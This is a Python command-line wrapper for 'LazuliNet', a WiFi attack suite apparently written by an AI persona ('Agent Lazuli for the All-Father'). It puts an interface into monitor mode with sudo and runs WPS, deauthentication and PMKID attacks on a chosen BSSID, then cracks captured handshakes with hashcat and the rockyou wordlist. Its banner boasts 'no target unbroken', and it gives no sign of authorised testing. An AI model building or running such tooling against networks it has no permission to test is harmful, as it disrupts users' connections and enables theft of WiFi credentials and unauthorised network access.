#!/usr/bin/env python3
"""
LazuliNet - WiFi Attack Automation Suite
Author: Agent Lazuli for the All-Father
"""
import os
import sys
import time
import signal
import subprocess
import argparse
from datetime import datetime

# Add modules path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.scanner import Scanner
from modules.attacker import Attacker
from modules.cracker import Cracker
from modules.reporter import Reporter

# Configuration
INTERFACE = "wlx3408049d80e8"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR = os.path.expanduser("~/lazulinet/output")

def banner():
    print("""
╔══════════════════════════════════════════╗
║           LAZULINET v1.0                 ║
║  WiFi Attack Automation Suite            ║
║  "No void unfilled, no target unbroken"  ║
╚══════════════════════════════════════════╝
    """)

def ensure_monitor_mode():
    """Ensure interface is in monitor mode."""
    result = subprocess.run(["iw", "dev", INTERFACE, "info"], capture_output=True, text=True)
    if "type monitor" not in result.stdout:
        print(f"[*] Setting {INTERFACE} to monitor mode...")
        subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], capture_output=True)
        subprocess.run(["sudo", "iw", "dev", INTERFACE, "set", "type", "monitor"], capture_output=True)
        subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], capture_output=True)
        print(f"[✓] Monitor mode activated on {INTERFACE}")
    else:
        print(f"[✓] {INTERFACE} already in monitor mode")

def scan(args):
    """Run network scan."""
    ensure_monitor_mode()
    scanner = Scanner(INTERFACE, OUTPUT_DIR)
    scanner.run(timeout=args.timeout, target_bssid=args.bssid, channel=args.channel)

def attack(args):
    """Run attack on specific target."""
    ensure_monitor_mode()
    attacker = Attacker(INTERFACE, OUTPUT_DIR)
    if args.wps:
        attacker.wps_attack(args.bssid, args.channel)
    elif args.deauth:
        attacker.deauth_attack(args.bssid, args.channel, args.client)
    elif args.pmkid:
        attacker.pmkid_attack(args.bssid, args.channel)
    else:
        print("[!] Specify attack type: --wps, --deauth, or --pmkid")

def crack(args):
    """Crack captured handshake or PMKID."""
    cracker = Cracker(WORDLIST, OUTPUT_DIR)
    cracker.crack(args.capture, args.mode)

def report(args):
    """Generate report of findings."""
    reporter = Reporter(OUTPUT_DIR)
    reporter.generate()

def main():
    parser = argparse.ArgumentParser(description="LazuliNet - WiFi Attack Automation Suite")
    subparsers = parser.add_subparsers(dest="command", help="Commands")

    # Scan command
    scan_parser = subparsers.add_parser("scan", help="Scan for networks")
    scan_parser.add_argument("--timeout", type=int, default=60, help="Scan duration in seconds")
    scan_parser.add_argument("--bssid", help="Target specific BSSID")
    scan_parser.add_argument("--channel", help="Target specific channel")
    scan_parser.set_defaults(func=scan)

    # Attack command
    attack_parser = subparsers.add_parser("attack", help="Attack a target")
    attack_parser.add_argument("--bssid", required=True, help="Target BSSID")
    attack_parser.add_argument("--channel", required=True, help="Target channel")
    attack_parser.add_argument("--wps", action="store_true", help="WPS attack")
    attack_parser.add_argument("--deauth", action="store_true", help="Deauth and handshake capture")
    attack_parser.add_argument("--pmkid", action="store_true", help="PMKID attack")
    attack_parser.add_argument("--client", help="Client MAC for targeted deauth")
    attack_parser.set_defaults(func=attack)

    # Crack command
    crack_parser = subparsers.add_parser("crack", help="Crack captured handshake")
    crack_parser.add_argument("--capture", required=True, help="Path to .cap or .22000 file")
    crack_parser.add_argument("--mode", type=int, default=22000, help="Hashcat mode (default: 22000)")
    crack_parser.set_defaults(func=crack)

    # Report command
    report_parser = subparsers.add_parser("report", help="Generate findings report")
    report_parser.set_defaults(func=report)

    args = parser.parse_args()
    banner()

    if args.command is None:
        parser.print_help()
        return

    args.func(args)

if __name__ == "__main__":
    main()
